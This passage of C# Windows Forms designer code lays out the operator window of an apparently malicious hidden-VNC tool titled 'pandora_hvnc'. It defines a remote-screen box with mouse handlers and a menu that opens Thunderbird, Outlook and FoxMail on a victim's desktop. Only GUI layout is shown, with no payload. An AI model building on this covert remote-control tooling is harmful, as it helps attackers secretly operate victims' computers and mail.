            this.guna2ContextMenuStrip3.RenderStyle.RoundedEdges = true;
            this.guna2ContextMenuStrip3.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
            this.guna2ContextMenuStrip3.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(33)))), ((int)(((byte)(43)))));
            this.guna2ContextMenuStrip3.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
            this.guna2ContextMenuStrip3.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
            this.guna2ContextMenuStrip3.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
            this.guna2ContextMenuStrip3.Size = new System.Drawing.Size(248, 100);
            // 
            // thunderbirdToolStripMenuItem
            // 
            this.thunderbirdToolStripMenuItem.ForeColor = System.Drawing.Color.Gainsboro;
            this.thunderbirdToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("thunderbirdToolStripMenuItem.Image")));
            this.thunderbirdToolStripMenuItem.Name = "thunderbirdToolStripMenuItem";
            this.thunderbirdToolStripMenuItem.Size = new System.Drawing.Size(247, 32);
            this.thunderbirdToolStripMenuItem.Text = "   Thunderbird               ";
            this.thunderbirdToolStripMenuItem.Click += new System.EventHandler(this.thunderbirdToolStripMenuItem_Click);
            // 
            // outlookToolStripMenuItem
            // 
            this.outlookToolStripMenuItem.ForeColor = System.Drawing.Color.Gainsboro;
            this.outlookToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("outlookToolStripMenuItem.Image")));
            this.outlookToolStripMenuItem.Name = "outlookToolStripMenuItem";
            this.outlookToolStripMenuItem.Size = new System.Drawing.Size(247, 32);
            this.outlookToolStripMenuItem.Text = "   Outlook";
            this.outlookToolStripMenuItem.Click += new System.EventHandler(this.outlookToolStripMenuItem_Click);
            // 
            // foxMailToolStripMenuItem
            // 
            this.foxMailToolStripMenuItem.ForeColor = System.Drawing.Color.Gainsboro;
            this.foxMailToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("foxMailToolStripMenuItem.Image")));
            this.foxMailToolStripMenuItem.Name = "foxMailToolStripMenuItem";
            this.foxMailToolStripMenuItem.Size = new System.Drawing.Size(247, 32);
            this.foxMailToolStripMenuItem.Text = "   FoxMail";
            this.foxMailToolStripMenuItem.Click += new System.EventHandler(this.foxMailToolStripMenuItem_Click);
            // 
            // VNCBox
            // 
            this.VNCBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(34)))), ((int)(((byte)(34)))), ((int)(((byte)(34)))));
            this.VNCBox.Dock = System.Windows.Forms.DockStyle.Fill;
            this.VNCBox.ErrorImage = null;
            this.VNCBox.InitialImage = null;
            this.VNCBox.Location = new System.Drawing.Point(0, 79);
            this.VNCBox.Name = "VNCBox";
            this.VNCBox.Size = new System.Drawing.Size(935, 354);
            this.VNCBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.VNCBox.TabIndex = 40;
            this.VNCBox.TabStop = false;
            this.VNCBox.MouseDown += new System.Windows.Forms.MouseEventHandler(this.VNCBox_MouseDown);
            this.VNCBox.MouseEnter += new System.EventHandler(this.VNCBox_MouseEnter);
            this.VNCBox.MouseLeave += new System.EventHandler(this.VNCBox_MouseLeave);
            this.VNCBox.MouseHover += new System.EventHandler(this.VNCBox_MouseHover);
            this.VNCBox.MouseMove += new System.Windows.Forms.MouseEventHandler(this.VNCBox_MouseMove);
            this.VNCBox.MouseUp += new System.Windows.Forms.MouseEventHandler(this.VNCBox_MouseUp);
            // 
            // FrmVNC
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Black;
            this.ClientSize = new System.Drawing.Size(935, 490);
            this.Controls.Add(this.VNCBox);
            this.Controls.Add(this.panel4);
            this.Controls.Add(this.panel3);
            this.Controls.Add(this.guna2ResizeBox1);
            this.Controls.Add(this.panel1);
            this.Controls.Add(this.statusStrip1);
            this.MinimizeBox = false;
            this.MinimumSize = new System.Drawing.Size(951, 529);
            this.Name = "FrmVNC";
            this.ShowIcon = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "pandora_hvnc";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.VNCForm_FormClosing);
            this.Load += new System.EventHandler(this.VNCForm_Load);
            this.Click += new System.EventHandler(this.VNCForm_Click);
            this.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.VNCForm_KeyPress);
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            this.statusStrip1.ResumeLayout(false);
            this.statusStrip1.PerformLayout();
            this.panel4.ResumeLayout(false);
            this.panel4.PerformLayout();
            this.panel3.ResumeLayout(false);
            this.panel3.PerformLayout();
            this.guna2ContextMenuStrip2.ResumeLayout(false);
            this.guna2ContextMenuStrip1.ResumeLayout(false);
            this.guna2ContextMenuStrip3.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.VNCBox)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void ClientRecoveryLabel_Click(object sender, EventArgs e)
        {

        }
    }
}
